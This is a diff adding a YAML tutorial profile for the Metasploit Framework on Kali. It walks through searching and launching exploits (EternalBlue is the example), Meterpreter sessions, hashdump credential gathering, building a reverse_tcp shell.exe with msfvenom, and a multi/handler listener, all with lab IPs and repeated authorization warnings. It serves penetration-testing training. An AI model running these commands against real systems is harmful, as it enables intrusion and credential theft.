@@ -1,0 +1,259 @@
+tool_id: metasploit
+display_name: "Metasploit Framework"
+binary_candidates: [msfconsole, msfvenom]
+categories: [exploitation, post_exploitation]
+os_profile: kali
+one_liner: "A framework to find, configure, and launch exploits + manage post-exploitation, against authorized targets."
+authorization_gate: true
+authorization_text: >
+  Metasploit launches real exploits and grants real access. Using it against systems you do
+  not own or lack explicit written permission to test is a serious crime. Continue only for
+  authorized targets. Practice on Metasploitable 2/3, your own VMs, HackTheBox, TryHackMe,
+  VulnHub. Continue?
+flows:
+  - flow_id: setup_db
+    title: "Setup & database"
+    goal: "Start PostgreSQL so the console can store hosts/loot."
+    command_builder_id: msfconsole
+    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
+    steps:
+      - step_id: ms1
+        title: "Init the DB and check db_status"
+        slot_target: ACTION_OPTIONS
+        glossary_refs: [framework, msfdb, datastore]
+        explanation:
+          what: "`sudo systemctl start postgresql` -> `sudo msfdb init` -> in console `db_status` (expect connected)."
+          why: "The DB stores hosts/services/loot (optional but very useful)."
+          where: "System + console grammar (step 0)."
+        try_this: "sudo systemctl start postgresql && sudo msfdb init   # then msfconsole -q -x \"db_status\""
+        success_criteria: "db_status shows connected."
+        alternatives:
+          - trigger: "not connected"
+            cause: "PostgreSQL not running or DB not initialised."
+            fix: "Start/enable postgresql; re-run msfdb init (or msfdb reinit)."
+            check: "See the Services troubleshooter for PostgreSQL."
+  - flow_id: search_use
+    title: "Find & select a module"
+    goal: "Search and select a module, then inspect it."
+    command_builder_id: msfconsole
+    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
+    steps:
+      - step_id: ms2
+        title: "search -> use -> show options"
+        slot_target: ACTION_OPTIONS
+        glossary_refs: [module_types, exploit]
+        explanation:
+          what: "`search type:exploit name:eternalblue`, then `use <n|path>`; inspect with info / show options / show payloads / show targets."
+          why: "Console grammar step 1-2: SELECT then INSPECT."
+          where: "ACTION_OPTIONS (-x script)."
+        try_this: "msfconsole -q -x \"search type:exploit name:eternalblue; use 0; show options\""
+        success_criteria: "The prompt changes to the module; show options lists what to set."
+        alternatives:
+          - trigger: "too many results"
+            cause: "Search too broad."
+            fix: "Add filters (type/platform/cve/rank)."
+            check: "Re-search with more filters."
+          - trigger: "nothing found"
+            cause: "Wrong terms/spelling."
+            fix: "Broaden or correct the search terms."
+            check: "Try a CVE filter."
+  - flow_id: configure_run
+    title: "Configure & run an exploit"
+    goal: "Set the datastore and fire."
+    command_builder_id: msfconsole
+    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
+    steps:
+      - step_id: ms3
+        title: "set RHOSTS/PAYLOAD/LHOST/LPORT -> check -> exploit"
+        slot_target: ACTION_OPTIONS
+        glossary_refs: [rhosts_lhost, payload, job, session]
+        explanation:
+          what: "`set RHOSTS <target>`, `set PAYLOAD <path>`, reverse payloads need `set LHOST <your-ip>` + `set LPORT`; `setg` is global; `check` then `exploit` (-j background, -z don't interact)."
+          why: "Console grammar step 3-5: CONFIGURE -> VERIFY -> RUN."
+          where: "ACTION_OPTIONS (-x script)."
+        try_this: "msfconsole -q -x \"use <exploit>; set RHOSTS 10.0.0.20; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.5; set LPORT 4444; check; exploit\""
+        success_criteria: "'Meterpreter session N opened' (or the exploit's success message)."
+        alternatives:
+          - trigger: "missing required option"
+            cause: "A required datastore value (often RHOSTS/LHOST) is blank."
+            fix: "`show options` and set the blanks."
+            check: "Re-run show options."
+          - trigger: "Exploit completed, but no session was created"
+            cause: "Wrong target/payload arch, host patched, or LHOST/port/firewall wrong."
+            fix: "Adjust payload/target; confirm reachability with nmap; verify LHOST is your IP on the route."
+            check: "nmap the target; double-check LHOST/LPORT."
+  - flow_id: auxiliary
+    title: "Auxiliary modules (scanners, no payload)"
+    goal: "Recon/enumeration without exploiting."
+    command_builder_id: msfconsole
+    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
+    steps:
+      - step_id: ms4
+        title: "use auxiliary/scanner -> set RHOSTS -> run"
+        slot_target: ACTION_OPTIONS
+        glossary_refs: [auxiliary]
+        explanation:
+          what: "`use auxiliary/scanner/<…>`, `set RHOSTS <range>`, `run`; results can store in the DB."
+          why: "A safe way to learn the workflow — no payload fired."
+          where: "ACTION_OPTIONS (-x script)."
+        try_this: "msfconsole -q -x \"use auxiliary/scanner/smb/smb_version; set RHOSTS 10.0.0.0/24; run\""
+        success_criteria: "Scanner results print (and store in hosts/services)."
+        alternatives:
+          - trigger: "no results"
+            cause: "Wrong RHOSTS range or service absent."
+            fix: "Confirm the range and that the service exists (nmap)."
+            check: "Re-run against a known host."
+  - flow_id: sessions_meterpreter
+    title: "Sessions & Meterpreter"
+    goal: "Interact with an opened session."
+    command_builder_id: msfconsole
+    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
+    steps:
+      - step_id: ms5
+        title: "sessions -i; meterpreter commands"
+        slot_target: ACTION_OPTIONS
+        glossary_refs: [meterpreter, session]
+        explanation:
+          what: "`sessions -l` list, `sessions -i <id>` interact, `background` to detach; in Meterpreter: sysinfo, getuid, ps, migrate <pid>, shell, download/upload, hashdump."
+          why: "hashdump output feeds john/hashcat for offline cracking."
+          where: "Console grammar step 6: INTERACT."
+        try_this: "msfconsole -q -x \"sessions -i 1\"   # then in meterpreter: sysinfo; getuid; hashdump"
+        success_criteria: "Meterpreter responds; commands return data."
+        alternatives:
+          - trigger: "session dies"
+            cause: "Unstable host process."
+            fix: "`migrate` to a stable process."
+            check: "ps then migrate <pid>."
+          - trigger: "no session"
+            cause: "Exploit didn't land."
+            fix: "Return to the configure/run flow."
+            check: "Re-check options and reachability."
+  - flow_id: post
+    title: "Post-exploitation modules"
+    goal: "Run after-access tasks against a session."
+    command_builder_id: msfconsole
+    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
+    steps:
+      - step_id: ms6
+        title: "use post/... -> set SESSION -> run"
+        slot_target: ACTION_OPTIONS
+        destructive: true
+        recovery: "Post modules act on a live compromised host — authorized engagements only."
+        glossary_refs: [post]
+        explanation:
+          what: "With a session open: `use post/<platform>/<…>`, `set SESSION <id>`, `run`."
+          why: "Gather creds, enumerate, or (authorized) persistence."
+          where: "ACTION_OPTIONS (-x script)."
+        try_this: "msfconsole -q -x \"use post/windows/gather/hashdump; set SESSION 1; run\""
+        success_criteria: "The post module returns its data (e.g. dumped hashes)."
+        alternatives:
+          - trigger: "module incompatible"
+            cause: "Wrong platform/session type."
+            fix: "Pick a post module matching the session's OS."
+            check: "sessions -l shows the platform."
+  - flow_id: payloads
+    title: "Payloads deep-dive"
+    goal: "Choose staged/stageless and reverse/bind correctly."
+    command_builder_id: msfconsole
+    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
+    steps:
+      - step_id: ms7
+        title: "staged vs stageless; reverse vs bind"
+        slot_target: ACTION_OPTIONS
+        glossary_refs: [staged_stageless, reverse_bind]
+        explanation:
+          what: "Staged uses `/` (small stager + stage); stageless uses `_` (one self-contained blob). Reverse connects back to your LHOST (NAT-friendly); bind opens a port on the target."
+          why: "Reverse is the usual choice through NAT; stageless is more reliable over flaky links."
+          where: "Concept; list with `show payloads` after `use <exploit>`."
+        try_this: "msfconsole -q -x \"use <exploit>; show payloads\""
+        success_criteria: "You can pick the right payload shape for the situation."
+        alternatives:
+          - trigger: "unreliable connection"
+            cause: "Staged payload over a flaky link."
+            fix: "Try a stageless payload (underscore variant)."
+            check: "Compare reliability."
+  - flow_id: msfvenom
+    title: "msfvenom (standalone payload generator)"
+    goal: "Generate a payload file."
+    command_builder_id: msfvenom
+    slots: [PROGRAM, ACTION_OPTIONS, OUTPUT_OPTIONS]
+    steps:
+      - step_id: ms8
+        title: "Build a reverse_tcp exe"
+        slot_target: ACTION_OPTIONS
+        destructive: true
+        recovery: "A generated payload is real malware on disk — handle only in an authorized lab; encoders are NOT reliable AV evasion."
+        glossary_refs: [msfvenom, staged_stageless, reverse_bind]
+        explanation:
+          what: "`-p <payload> LHOST= LPORT= -f <format> -o <file>`; -e encoder / -b badchars / -a arch / --platform shape it."
+          why: "Creates a deliverable payload; you then catch it with multi/handler."
+          where: "-p + datastore in ACTION; -f/-o in OUTPUT."
+        try_this: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe"
+        success_criteria: "shell.exe is written."
+        alternatives:
+          - trigger: "unknown format/payload"
+            cause: "Typo or unsupported value."
+            fix: "List options: --list formats / --list payloads."
+            check: "Re-run with a listed value."
+  - flow_id: handler
+    title: "multi/handler (catch the callback)"
+    goal: "Listen for a reverse payload."
+    command_builder_id: msfconsole
+    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
+    steps:
+      - step_id: ms9
+        title: "Set up the listener"
+        slot_target: ACTION_OPTIONS
+        glossary_refs: [handler, job]
+        explanation:
+          what: "`use exploit/multi/handler`, `set PAYLOAD <same as msfvenom>`, `set LHOST`, `set LPORT`, `exploit -j` (background)."
+          why: "A reverse payload needs a matching listener to connect back to."
+          where: "ACTION_OPTIONS (-x script)."
+        try_this: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.5; set LPORT 4444; exploit -j\""
+        success_criteria: "The listener starts as a background job."
+        alternatives:
+          - trigger: "no callback"
+            cause: "Payload LHOST/LPORT don't match the handler, or routing/firewall blocks it."
+            fix: "Make payload and handler LHOST/LPORT identical; check routing/firewall."
+            check: "Compare msfvenom LHOST/LPORT to the handler."
+  - flow_id: workflow_db
+    title: "Workflow aids (DB, nmap import, workspaces)"
+    goal: "Organize an engagement in the DB."
+    command_builder_id: msfconsole
+    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
+    steps:
+      - step_id: ms10
+        title: "workspaces, db_nmap, hosts/services"
+        slot_target: ACTION_OPTIONS
+        glossary_refs: [workspace, datastore]
+        explanation:
+          what: "`workspace -a <name>` isolates engagements; `db_nmap <args>` scans+stores; `db_import <xml>`; review with hosts/services/vulns/creds/loot; automate with resource <file.rc> / makerc."
+          why: "Keeps findings organized and repeatable."
+          where: "ACTION_OPTIONS (-x script)."
+        try_this: "msfconsole -q -x \"workspace -a lab; db_nmap -sV 10.0.0.0/24; hosts; services\""
+        success_criteria: "Scan results are stored and listed by hosts/services."
+        alternatives:
+          - trigger: "db_nmap not found"
+            cause: "DB not connected."
+            fix: "Set up the DB first (setup flow)."
+            check: "db_status connected."
+  - flow_id: maintenance
+    title: "Maintenance / updating (Kali note)"
+    goal: "Update Metasploit the Kali way."
+    command_builder_id: msfconsole
+    slots: [PROGRAM]
+    steps:
+      - step_id: ms11
+        title: "Update via apt on Kali"
+        slot_target: null
+        explanation:
+          what: "On Kali, update via apt: `sudo apt update && sudo apt install metasploit-framework` (not msfupdate)."
+          why: "Kali packages Metasploit; apt keeps it consistent with the distro."
+          where: "System maintenance (concept)."
+        try_this: "sudo apt update && sudo apt install metasploit-framework"
+        success_criteria: "Metasploit updates to the packaged version."
+        alternatives:
+          - trigger: "apt errors"
+            cause: "Package/keyring issues."
+            fix: "See the Packages/keys/certs troubleshooter."
+            check: "Resolve apt first, then retry."
